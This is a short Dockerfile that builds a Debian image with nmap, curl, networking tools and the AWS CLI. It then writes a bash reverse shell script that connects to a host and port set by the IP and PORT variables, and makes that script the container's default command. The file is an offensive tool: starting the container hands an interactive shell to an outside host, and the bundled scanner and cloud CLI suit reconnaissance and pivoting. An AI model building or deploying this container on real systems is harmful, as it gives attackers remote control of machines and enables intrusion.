
FROM debian:latest


ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
apt-get -y install --no-install-recommends curl nmap iproute2 inetutils-ping unzip ca-certificates && apt-get clean && rm -rf /var/lib/apt/lists/*

RUN curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && \
  unzip awscliv2.zip && \
  ./aws/install 

RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]
  